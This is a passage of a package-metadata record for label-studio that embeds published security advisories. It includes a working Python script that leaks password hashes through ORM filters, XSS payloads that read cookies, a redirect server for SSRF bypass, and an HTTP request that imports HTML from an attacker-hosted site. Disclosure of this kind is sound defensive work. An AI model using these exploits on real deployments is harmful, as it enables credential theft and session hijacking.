parse_args()\n    view_id = args.view_id\n    project_id = args.project_id\n    path_1 = \"/api/dm/views/{view_id}?interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    path_2 = \"/api/tasks?page=1&page_size=1&view={view_id}&interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    PAYLOAD[\"id\"] = view_id\n    PAYLOAD[\"project\"] = str(project_id)\n    \n    config_dict = {\n        'COOKIE_STR': args.cookie_str,\n        'URL_PATH_1': args.url + path_1,\n        'URL_PATH_2': args.url + path_2,\n        'PAYLOAD': PAYLOAD\n    }\n    return config_dict\n\ndef test_payload(config_dict: dict, payload) -> bool:\n    sys.stdout.flush()\n    cookie_str = config_dict[\"COOKIE_STR\"]\n    r_set = requests.patch(\n        config_dict[\"URL_PATH_1\"],\n        json=payload,\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_listen = requests.get(\n        config_dict['URL_PATH_2'],\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_json = r_listen.json()\n    return len(r_json[\"tasks\"]) >= 1\n\ndef test_char(config_dict, known_hash, c):\n    json_payload_suffix = PAYLOAD\n    test_escaped = re.escape(known_hash + c)\n    json_payload_suffix[\"data\"][\"filters\"][\"items\"][0][\"value\"] =  f\"^{test_escaped}\"\n\n    suffix_result = test_payload(config_dict, json_payload_suffix)\n    if suffix_result:\n        return (known_hash + c, c)\n    \n    return None\n\ndef main():\n    config_dict = setup()\n    # By default Label Studio password hashes start with these characters\n    known_hash = \"pbkdf2_sha256$260000$\"\n    print()\n    print(f\"dumped: {known_hash}\", end=\"\")\n    sys.stdout.flush()\n\n    while True:\n        found = False\n\n        for c in CHARS:\n            r = test_char(config_dict, known_hash, c)\n            if not r is None:\n                new_hash, c = r\n                known_hash = new_hash\n                print(c, end=\"\")\n                sys.stdout.flush()\n                found = True\n                break\n\n        if not found:\n            break\n\n    print()\n\nif __name__ == \"__main__\":\n    main()\n```","fixed_in":["1.9.2.post0"],"id":"GHSA-6hjj-gq77-j4qw","link":"https://osv.dev/vulnerability/GHSA-6hjj-gq77-j4qw","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-26152"],"details":"### Summary\nOn all Label Studio versions prior to 1.11.0, data imported via file upload feature is not properly sanitized prior to being rendered within a [`Choices`](https://labelstud.io/tags/choices) or [`Labels`](https://labelstud.io/tags/labels) tag, resulting in an XSS vulnerability.\n\n### Details\nNeed permission to use the \"data import\" function. This was reproduced on Label Studio 1.10.1.\n\n### PoC\n\n1. Create a project.\n![Create a project](https://github.com/HumanSignal/label-studio/assets/3943358/9b1536ad-feac-4238-a1bd-ca9b1b798673)\n\n2. Upload a file containing the payload using the \"Upload Files\" function.\n![2  Upload a file containing the payload using the Upload Files function](https://github.com/HumanSignal/label-studio/assets/3943358/26bb7af1-1cd2-408f-9adf-61e31a5b7328)\n![3  complete](https://github.com/HumanSignal/label-studio/assets/3943358/f2f62774-1fa6-4456-9e6f-8fa1ca0a2d2e)\n\nThe following are the contents of the files used in the PoC\n```\n{\n  \"data\": {\n    \"prompt\": \"labelstudio universe image\",\n    \"images\": [\n      {\n        \"value\": \"id123#0\",\n        \"style\": \"margin: 5px\",\n        \"html\": \"<img width='400' src='https://labelstud.io/_astro/images-tab.64279c16_ZaBSvC.avif' onload=alert(document.cookie)>\"\n      }\n    ]\n  }\n}\n```\n\n3. Select the text-to-image generation labeling template of Ranking and scoring\n![3  Select the text-to-image generation labelling template for Ranking and scoring](https://github.com/HumanSignal/label-studio/assets/3943358/f227f49c-a718-4738-bc2a-807da4f97155)\n![5  save](https://github.com/HumanSignal/label-studio/assets/3943358/9b529f8a-8e99-4bb0-bdf6-bb7a95c9b75d)\n\n4. Select a task\n![4  Select a task](https://github.com/HumanSignal/label-studio/assets/3943358/71856b7a-2b1f-44ea-99ab-fc48bc20caa7)\n\n5. Check that the script is running\n![5  Check that the script is running](https://github.com/HumanSignal/label-studio/assets/3943358/e396ae7b-a591-4db7-afe9-5bab30b48cb9)\n\n### Impact\nMalicious scripts can be injected into the code, and when linked with vulnerabilities such as CSRF, it can cause even greater damage. In particular, It can become a source of further attacks, especially when linked to social engineering.\n","fixed_in":["1.11.0"],"id":"GHSA-6xv9-957j-qfhg","link":"https://osv.dev/vulnerability/GHSA-6xv9-957j-qfhg","source":"osv","summary":null,"withdrawn":null}]},"1.8.2.post0":{"info":{"author":"Heartex","author_email":"hello@heartex.ai","bugtrack_url":null,"classifiers":["License :: OSI Approved :: Apache Software License","Operating System :: OS Independent","Programming Language :: Python :: 3"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"https://github.com/heartexlabs/label-studio","keywords":"","license":"","maintainer":"","maintainer_email":"","name":"label-studio","package_url":"https://pypi.org/project/label-studio/","platform":null,"project_url":"https://pypi.org/project/label-studio/","project_urls":{"Homepage":"https://github.com/heartexlabs/label-studio"},"provides_extra":null,"release_url":"https://pypi.org/project/label-studio/1.8.2.post0/","requires_dist":["wheel (<=0.40.0,>=0.38.1)","appdirs (>=1.4.3)","attr (==0.3.1)","attrs (>=19.2.0)","pyyaml (>=5.3.1)","azure-storage-blob (>=12.6.0)","boto (~=2.49.0)","boto3 (~=1.16.28)","botocore (~=1.19.28)","bleach (~=5.0.0)","google-api-core (==2.11.0)","google-auth (==2.14.1)","google-cloud-appengine-logging (==1.1.0)","google-cloud-audit-log (==0.2.0)","google-cloud-core (==2.3.2)","google-cloud-storage (~=2.5.0)","google-cloud-logging (~=2.7.0)","google-resumable-media (==2.3.3)","googleapis-common-protos (==1.56.4)","grpc-google-iam-v1 (==0.12.4)","Django (==3.2.20)","django-storages (==1.12.3)","django-annoying (==0.10.6)","django-debug-toolbar (==3.2.1)","django-environ (==0.10.0)","django-filter (==2.4.0)","django-model-utils (==4.1.1)","django-rq (==2.5.1)","django-cors-headers (==3.6.0)","django-extensions (==3.1.0)","django-rest-swagger (==2.2.0)","django-user-agents (==0.4.0)","django-ranged-fileresponse (>=0.1.2)","drf-dynamic-fields (==0.3.0)","djangorestframework (==3.13.1)","drf-flex-fields (==0.9.5)","drf-yasg (==1.20.0)","drf-generators (==0.3.0)","htmlmin (==0.1.12)","jsonschema (==3.2.0)","lockfile (>=0.12.0)","lxml (>=4.2.5)","defusedxml (>=0.7.1)","numpy (==1.24.3)","ordered-set (==4.0.2)","pandas (>=0.24.0)","protobuf (>=3.15.5)","psycopg2-binary (==2.9.6)","pydantic (<=1.11.0,>=1.7.3)","python-dateutil (==2.8.1)","pytz (~=2022.1)","requests (==2.31.0)","urllib3 (==1.26.16)","rq (==1.10.1)","rules (==2.2)","ujson (>=3.0.0)","xmljson (==0.2.0)","colorama (>=0.4.4)","boxing (>=0.1.4)","redis (~=3.5)","sentry-sdk (>=1.1.0)","launchdarkly-server-sdk (==7.5.0)","python-json-logger (==2.0.4)","label-studio-converter (==0.0.54rc0)","mysqlclient ; extra == 'mysql'"],"requires_python":">=3.6","summary":"Label Studio annotation tool","version":"1.8.2.post0","yanked":false,"yanked_reason":null},"last_serial":25820833,"urls":[{"comment_text":"","digests":{"blake2b_256":"3bafa8f77b7d794a9a04bc5e7378f58c884fd2fbcf0c7bd52c47f3bb3705725d","md5":"35d500943240bb8489c23824c98ad0b1","sha256":"5babe821073da27ca962201eb75ad6161e2e3d1bc835f9840ef08c5a645d30e4"},"downloads":-1,"filename":"label_studio-1.8.2.post0-py3-none-any.whl","has_sig":false,"md5_digest":"35d500943240bb8489c23824c98ad0b1","packagetype":"bdist_wheel","python_version":"py3","requires_python":">=3.6","size":53086820,"upload_time":"2023-09-15T17:38:36","upload_time_iso_8601":"2023-09-15T17:38:36.253576Z","url":"https://files.pythonhosted.org/packages/3b/af/a8f77b7d794a9a04bc5e7378f58c884fd2fbcf0c7bd52c47f3bb3705725d/label_studio-1.8.2.post0-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"fe19b7bea393d47c5d19cba2c547d4ff3b9df69d51397c1925a7aa14a13debc8","md5":"ff9ecd20e01c95397ba365ef053db659","sha256":"8b1206ff4766e9c65ff069b43fa2b6787c18379af65b11ccaf8607f9eb4ddfd6"},"downloads":-1,"filename":"label-studio-1.8.2.post0.tar.gz","has_sig":false,"md5_digest":"ff9ecd20e01c95397ba365ef053db659","packagetype":"sdist","python_version":"source","requires_python":">=3.6","size":52043479,"upload_time":"2023-09-15T17:38:41","upload_time_iso_8601":"2023-09-15T17:38:41.244889Z","url":"https://files.pythonhosted.org/packages/fe/19/b7bea393d47c5d19cba2c547d4ff3b9df69d51397c1925a7aa14a13debc8/label-studio-1.8.2.post0.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2023-47116"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to [`1.11.0`](https://github.com/HumanSignal/label-studio/releases/tag/1.11.0) and was tested on version `1.8.2`.\n\n# Overview\n\nLabel Studio's SSRF protections that can be enabled by setting the `SSRF_PROTECTION_ENABLED` environment variable can be bypassed to access internal web servers. This is because the current SSRF validation is done by executing a single DNS lookup to verify that the IP address is not in an excluded subnet range. This protection can be bypassed by either using HTTP redirection or performing a [DNS rebinding attack](https://en.wikipedia.org/wiki/DNS_rebinding).\n\n# Description\n\nThe following `tasks_from_url` method in [`label_studio/data_import/uploader.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_import/uploader.py#L127-L155) performs the SSRF validation (`validate_upload_url`) before sending the request.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1]\n\n        validate_upload_url(url, block_local_urls=settings.SSRF_PROTECTION_ENABLED)\n        # Reason for #nosec: url has been validated as SSRF safe by the\n        # validation check above.\n        response = requests.get(\n            url, verify=False, headers={'Accept-Encoding': None}\n        )  # nosec\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(\n            user, project, SimpleUploadedFile(filename, file_content)\n        )\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(\n            project, file_upload_ids\n        )\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n\nThe `validate_upload_url` code in [`label_studio/core/utils/io.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/core/utils/io.py#L174-L209) is shown below.\n\n```python\ndef validate_upload_url(url, block_local_urls=True):\n    \"\"\"Utility function for defending against SSRF attacks. Raises\n        - InvalidUploadUrlError if the url is not HTTP[S], or if block_local_urls is enabled\n          and the URL resolves to a local address.\n        - LabelStudioApiException if the hostname cannot be resolved\n\n    :param url: Url to be checked for validity/safety,\n    :param block_local_urls: Whether urls that resolve to local/private networks should be allowed.\n    \"\"\"\n\n    parsed_url = parse_url(url)\n\n    if parsed_url.scheme not in ('http', 'https'):\n        raise InvalidUploadUrlError\n\n    domain = parsed_url.host\n    try:\n        ip = socket.gethostbyname(domain)\n    except socket.error:\n        from core.utils.exceptions import LabelStudioAPIException\n        raise LabelStudioAPIException(f\"Can't resolve hostname {domain}\")\n\n    if not block_local_urls:\n        return\n\n    if ip == '0.0.0.0':  # nosec\n        raise InvalidUploadUrlError\n    local_subnets = [\n        '127.0.0.0/8',\n        '10.0.0.0/8',\n        '172.16.0.0/12',\n        '192.168.0.0/16',\n    ]\n    for subnet in local_subnets:\n        if ipaddress.ip_address(ip) in ipaddress.ip_network(subnet):\n            raise InvalidUploadUrlError\n```\n\nThe issue here is the SSRF validation is only performed before the request is sent, and does not validate the destination IP address. Therefore, an attacker can either redirect the request or perform a DNS rebinding attack to bypass this protection.\n\n# Proof of Concept\n\nBoth the HTTP redirection and DNS rebinding methods for bypassing Label Studio's SSRF protections are explained below.\n\n### HTTP Redirection\n\nThe python `requests` module automatically follows HTTP redirects (eg. response code `301` and `302`). Therefore, an attacker could use a URL shortener (eg. `https://www.shorturl.at/`) or host the following Python code on an external server to redirect request from a Label Studio server to an internal web server.\n\n```python\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass RedirectHandler(BaseHTTPRequestHandler):\n\n    def do_GET(self):\n        self.send_response(301)\n        # skip first slash\n        self.send_header('Location', self.path[1:])\n        self.end_headers()\n\nHTTPServer((\"\", 8080), RedirectHandler).serve_forever()\n```\n\n### DNS Rebinding Attack\n\nDNS rebinding can bypass SSRF protections by resolving to an external IP address for the first resolution, but when the request is sent resolves to an internal IP address that is blocked. For an example, the domain `7f000001.030d1fd6.rbndr.us` will randomly switch between the IP address `3.13.31.214` that is not blocked to `127.0.0.1` which is not allowed.\n\n# Impact\n\nSSRF vulnerabilities pose a significant risk on cloud environments, since instance credentials are managed by internal web APIs. An attacker can bypass Label Studio's SSRF protections to access internal web servers and partially compromise the confidentiality of those internal servers.\n\n# Remediation Advice\n\n* Before saving any responses, validate the destination IP address is not in the deny list.\n* Consider blocking internal cloud API IP ranges to mitigate the risk of compromising cloud credentials.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.11.0"],"id":"GHSA-p59w-9gqw-wj8r","link":"https://osv.dev/vulnerability/GHSA-p59w-9gqw-wj8r","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47115"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2` and was tested on version `1.8.2`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) has a cross-site scripting (XSS) vulnerability that could be exploited when an authenticated user uploads a crafted image file for their avatar that gets rendered as a HTML file on the website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/functions.py#L18-L49) shows that the only verification check is that the file is an image by extracting the dimensions from the file.\n\n```python\n\ndef hash_upload(instance, filename):\n    filename = str(uuid.uuid4())[0:8] + '-' + filename\n    return settings.AVATAR_PATH + '/' + filename <3>\n\n\ndef check_avatar(files):\n    images = list(files.items())\n    if not images:\n        return None\n\n    filename, avatar = list(files.items())[0]  # get first file\n    w, h = get_image_dimensions(avatar) <1>\n    if not w or not h:\n        raise forms.ValidationError(\"Can't read image, try another one\")\n\n    # validate dimensions\n    max_width = max_height = 1200\n    if w > max_width or h > max_height:\n        raise forms.ValidationError('Please use an image that is %s x %s pixels or smaller.'\n                                    % (max_width, max_height))\n\n    # validate content type\n    main, sub = avatar.content_type.split('/') <2>\n    if not (main == 'image' and sub.lower() in ['jpeg', 'jpg', 'gif', 'png']):\n        raise forms.ValidationError(u'Please use a JPEG, GIF or PNG image.')\n\n    # validate file size\n    max_size = 1024 * 1024\n    if len(avatar) > max_size:\n        raise forms.ValidationError('Avatar file size may not exceed ' + str(max_size/1024) + ' kb')\n\n    return avatar\n```\n1. Attempts to get image dimensions to validate the uploaded avatar file is an image.\n2. Extracts the `Content-Type` from the upload `POST` request. A user can easily bypass this verification by changing the mimetype of the uploaded file to an allowed type (eg. `image/jpeg`).\n3. The file extension of the uploaded file is never validated and is saved to the filesystem.\n\n[Label Studio serves avatar images using Django's built-in `serve` view](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/urls.py#L25-L26), which is [not secure for production use according to Django's documentation](https://docs.djangoproject.com/en/4.2/ref/views/#serving-files-in-development).\n\n```python\n    re_path(r'^data/' + settings.AVATAR_PATH + '/(?P<path>.*)$', serve,\n            kwargs={'document_root': join(settings.MEDIA_ROOT, settings.AVATAR_PATH)}),\n```\n\nThe issue with the Django `serve` view is that it determines the `Content-Type` of the response by the file extension in the URL path. Therefore, an attacker can upload an image that contains malicious HTML code and name the file with a `.html` extension to be rendered as a HTML page. The only file extension validation is performed on the client-side, which can be easily bypassed.\n\n# Proof of Concept\n\nBelow are the steps to reproduce this issue and execute JavaScript code in the context of the Label Studio website.\n\n1. Using any JPEG or PNG image, add in the comment field in the metadata the HTML code `<script>alert(document.domain)</script>`. This can be done using the `exiftool` command as shown below that was used to create the following image.\n\n```bash\nexiftool -Comment='<script>alert(document.domain)</script>' penguin.jpg\n```\n\n![xss-penguin](https://user-images.githubusercontent.com/139727151/266989884-c2cd9b4f-f374-416e-a468-acf41f52e088.jpg)\n\n2. On Label Studio, navigate to account & settings page and intercept the upload request of the avatar image using a tool such as Burp Suite. Modify the filename in the request to have a `.html` extension.\n\n3. Right click the image on the avatar profile and copy the URL. Send this to a victim and it will display an alert box with the host name of the Label Studio instance as shown below.\n\n![xss-alert](https://user-images.githubusercontent.com/139727151/266989952-6fb74c6e-9961-447c-a602-5a6f36627ae6.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* Validate the file extension on the server side, not in client-side code.\n* Remove the use of Django's `serve` view and implement a secure controller for viewing uploaded avatar images.\n* Consider saving file content in the database rather than on the filesystem to mitigate against other file related vulnerabilities.\n* Avoid trusting user controlled inputs.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.9.2"],"id":"GHSA-q68h-xwq5-mm7x","link":"https://osv.dev/vulnerability/GHSA-q68h-xwq5-mm7x","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-23633"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.10.1` and was tested on version `1.9.2.post0`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) had a remote import feature allowed users to import data from a remote web source, that was downloaded and could be viewed on the website. This feature could had been abused to download a HTML file that executed malicious JavaScript code in the context of the Label Studio website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/uploader.py#L125C5-L146) showed that is a URL passed the SSRF verification checks, the contents of the file would be downloaded using the filename in the URL.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1] <1>\n\n        response = ssrf_safe_get(\n            url, verify=project.organization.should_verify_ssl_certs(), stream=True, headers={'Accept-Encoding': None}\n        )\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(user, project, SimpleUploadedFile(filename, file_content))\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(project, file_upload_ids)\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n1. The file name that was set was retrieved from the URL.\n\nThe downloaded file path could then be retrieved by sending a request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]` where `{project_id}` was the ID of the project and `{download_id}` was the ID of the downloaded file. Once the downloaded file path was retrieved by the previous API endpoint, the [following code snippet](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/api.py#L595C1-L616C62) demonstrated that the `Content-Type` of the response was determined by the file extension, since `mimetypes.guess_type` guesses the `Content-Type` based on the file extension.\n\n```python\nclass UploadedFileResponse(generics.RetrieveAPIView):\n    permission_classes = (IsAuthenticated,)\n\n    @swagger_auto_schema(auto_schema=None)\n    def get(self, *args, **kwargs):\n        request = self.request\n        filename = kwargs['filename']\n        # XXX needed, on windows os.path.join generates '\\' which breaks FileUpload\n        file = settings.UPLOAD_DIR + ('/' if not settings.UPLOAD_DIR.endswith('/') else '') + filename\n        logger.debug(f'Fetch uploaded file by user {request.user} => {file}')\n        file_upload = FileUpload.objects.filter(file=file).last()\n\n        if not file_upload.has_permission(request.user):\n            return Response(status=status.HTTP_403_FORBIDDEN)\n\n        file = file_upload.file\n        if file.storage.exists(file.name):\n            content_type, encoding = mimetypes.guess_type(str(file.name)) <1>\n            content_type = content_type or 'application/octet-stream'\n            return RangedFileResponse(request, file.open(mode='rb'), content_type=content_type)\n        else:\n            return Response(status=status.HTTP_404_NOT_FOUND)\n```\n1. Determines the `Content-Type` based on the extension of the uploaded file by using `mimetypes.guess_type`.\n\nSince the `Content-Type` was determined by the file extension of the downloaded file, an attacker could import in a `.html` file that would execute JavaScript when visited.\n\n# Proof of Concept\n\nBelow were the steps to recreate this issue:\n\n1. Host the following HTML proof of concept (POC) script on an external website with the file extension `.html` that would be downloaded to the Label Studio website.\n\n```html\n<html>\n    <body>\n        <h1>Data Import XSS</h1>\n        <script>\n            alert(document.domain);\n        </script>\n    </body>\n</html>\n```\n\n2. Send the following `POST` request to download the HTML POC to the Label Studio and note the returned ID of the downloaded file in the response. In the following POC the `{victim_host}` is the address and port of the victim Label Studio website (eg. `labelstudio.com:8080`), `{project_id}` is the ID of the project where the data would be imported into, `{cookies}` are session cookies and `{evil_site}` is the website hosting the malicious HTML file (named `xss.html` in the following example).\n\n```http\nPOST /api/projects/{project_id}/import?commit_to_project=false HTTP/1.1\nHost: {victim_host}\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\ncontent-type: application/x-www-form-urlencoded\nContent-Length: 43\nConnection: close\nCookie: {cookies}\nPragma: no-cache\nCache-Control: no-cache\n\nurl=https://{evil_site}/xss.html\n```\n\n3. To retrieve the downloaded file path could be retrieved by sending a `GET` request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]`, where `{download_id}` is the ID of the file download from the previous step.\n\n4. Send your victim a link to `/data/{file_path}`, where `{file_path}` is the path of the downloaded file from the previous step. The following screenshot demonstrated executing the POC JavaScript code by visiting `/data/upload/1/cfcfc340-xss.html`.\n\n![xss-import-alert](https://user-images.githubusercontent.com/139727151/282223222-d8f9132c-838e-4aa6-9c03-a2bc83b4a409.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* For all user provided files that are downloaded by Label Studio, set the `Content-Security-Policy: sandbox;` response header when viewed on the site. The `sandbox` directive restricts a page's actions to prevent popups, execution of plugins and scripts and enforces a `same-origin` policy ([documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox)).\n* Restrict the allowed file extensions that could be downloaded.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.10.1"],"id":"GHSA-fq23-g58m-799r","link":"https://osv.dev/vulnerability/GHSA-fq23-g58m-799r","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47117"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2post0` and was tested on version `1.8.2`.\n\n# Overview\n\nIn all current versions of [Label Studio](https://github.com/HumanSignal/label-studio), the application allows users to insecurely set filters for filtering tasks. An attacker can construct a *filter chain* to filter tasks based on sensitive fields for all user accounts on the platform by exploiting Django's Object Relational Mapper (ORM). Since the results of query can be manipulated by the ORM filter, an attacker can leak these sensitive fields character by character. For an example, the following filter chain will task results by the password hash of an account on Label Studio.\n\n```\nfilter:tasks:updated_by__active_organization__active_users__password\n```\n\nFor consistency, this type of vulnerability will be termed as **ORM Leak** in the rest of this disclosure. \n\nIn addition, Label Studio had a hard coded secret key that an attacker can use to forge a session token of any user by exploiting this ORM Leak vulnerability to leak account password hashes.\n\n# Description\n\nThe following code snippet from the `ViewSetSerializer` in [`label_studio/data_manager/serializers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/serializers.py#L115) insecurely creates `Filter` objects from a JSON `POST` request to the `/api/dm/views/{viewId}` API endpoint.\n\n```python\n    @staticmethod\n    def _create_filters(filter_group, filters_data):\n        filter_index = 0\n        for filter_data in filters_data:\n            filter_data[\"index\"] = filter_index\n            filter_group.filters.add(Filter.objects.create(**filter_data))\n            filter_index += 1\n```\n\nThese `Filter` objects are then applied in the `TaskQuerySet` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L473).\n\n```python\nclass TaskQuerySet(models.QuerySet):\n    def prepared(self, prepare_params=None):\n        \"\"\" Apply filters, ordering and selected items to queryset\n\n        :param prepare_params: prepare params with project, filters, orderings, etc\n        :return: ordered and filtered queryset\n        \"\"\"\n        from projects.models import Project\n\n        queryset = self\n\n        if prepare_params is None:\n            return queryset\n\n        project = Project.objects.get(pk=prepare_params.project)\n        request = prepare_params.request\n        queryset = apply_filters(queryset, prepare_params.filters, project, request) <1>\n        queryset = apply_ordering(queryset, prepare_params.ordering, project, request, view_data=prepare_params.data)\n\n        if not prepare_params.selectedItems:\n            return queryset\n\n        # included selected items\n        if prepare_params.selectedItems.all is False and prepare_params.selectedItems.included:\n            queryset = queryset.filter(id__in=prepare_params.selectedItems.included)\n\n        # excluded selected items\n        elif prepare_params.selectedItems.all is True and prepare_params.selectedItems.excluded:\n            queryset = queryset.exclude(id__in=prepare_params.selectedItems.excluded)\n\n        return queryset\n```\n1. User provided filters are insecurely applied here by calling the `apply_filters` that constructs the Django ORM filter.\n\nThe `PreparedTaskManager` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L655) uses the vulnerable `TaskQuerySet` for building the Django queryset for querying `Task` objects, as shown in the following code snippet.\n\n```python\nclass PreparedTaskManager(models.Manager):\n    #...\n\n    def get_queryset(self, fields_for_evaluation=None, prepare_params=None, all_fields=False): <1>\n        \"\"\"\n        :param fields_for_evaluation: list of annotated fields in task\n        :param prepare_params: filters, ordering, selected items\n        :param all_fields: evaluate all fields for task\n        :param request: request for user extraction\n        :return: task queryset with annotated fields\n        \"\"\"\n        queryset = self.only_filtered(prepare_params=prepare_params)\n        return self.annotate_queryset(\n            queryset,\n            fields_for_evaluation=fields_for_evaluation,\n            all_fields=all_fields,\n            request=prepare_params.request\n        )\n\n    def only_filtered(self, prepare_params=None):\n        request = prepare_params.request\n        queryset = TaskQuerySet(self.model).filter(project=prepare_params.project) <1>\n        fields_for_filter_ordering = get_fields_for_filter_ordering(prepare_params)\n        queryset = self.annotate_queryset(queryset, fields_for_evaluation=fields_for_filter_ordering, request=request)\n        return queryset.prepared(prepare_params=prepare_params)\n```\n1. Special Django method for the `models.Manager` class that is used to retrieve the queryset for querying objects of a model.\n2. Uses the vulnerable `TaskQuerySet` that was explained above.\n\nThe following code snippet of the `Task` model in [`label_studio/tasks/models.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/models.py#L49C1-L102C102) shows that the vulnerable `PreparedTaskManager` is set as a class variable, along with the `updated_by` relational mapping to a Django user that will be exploited as the entrypoint of the filter chain.\n\n```python\n# ...\nclass Task(TaskMixin, models.Model):\n    \"\"\" Business tasks from project\n    \"\"\"\n    id = models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID', db_index=True)\n\n    # ...\n\n    updated_by = models.ForeignKey(settings.AUTH_USER_MODEL, related_name='updated_tasks',\n        on_delete=models.SET_NULL, null=True, verbose_name=_('updated by'),\n        help_text='Last annotator or reviewer who updated this task') <1>\n\n    # ...\n\n    objects = TaskManager()  # task manager by default\n    prepared = PreparedTaskManager()  # task manager with filters, ordering, etc for data_manager app <2>\n\n    # ...\n```\n1. The entry point of the filter chain to filter by the `updated_by__active_organization__active_users__password`.\n2. The vulnerable `PreparedTaskManager` being set that will be exploited.\n\nFinally, the `TaskListAPI` view set in [`label_studio/tasks/api.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/api.py#L205) with the `/api/tasks` API endpoint uses the vulnerable `PreparedTaskManager` to filter `Task` objects.\n\n```python\n    def get_queryset(self):\n        task_id = self.request.parser_context['kwargs'].get('pk')\n        task = generics.get_object_or_404(Task, pk=task_id)\n        review = bool_from_request(self.request.GET, 'review', False)\n        selected = {\"all\": False, \"included\": [self.kwargs.get(\"pk\")]}\n        if review:\n            kwargs = {\n                'fields_for_evaluation': ['annotators', 'reviewed']\n            }\n        else:\n            kwargs = {'all_fields': True}\n        project = self.request.query_params.get('project') or self.request.data.get('project')\n        if not project:\n            project = task.project.id\n        return self.prefetch(\n            Task.prepared.get_queryset(\n                prepare_params=PrepareParams(project=project, selectedItems=selected, request=self.request),\n                **kwargs\n            )) <1>\n```\n1. Uses the vulnerable `PreparedTaskManager` to filter objects.\n\n# Proof of Concept\n\nBelow are the steps to exploit about how to exploit this vulnerability to leak the password hash of an account on Label Studio.\n\n1. Create two accounts on Label Studio and choose one account to be the victim and the other the hacker account that you will use.\n2. Create a new project or use an existing project, then add a task to the project. Update the task with the hacker account to cause the entry point of the filter chain.\n3. Navigate to the task view for the project and add any filter with the `Network` inspect tab open on the browser. Look for a `PATCH` request to `/api/dm/views/{view_id}?interaction=filter&project={project_id}` and save the `view_id` and `project_id` for the 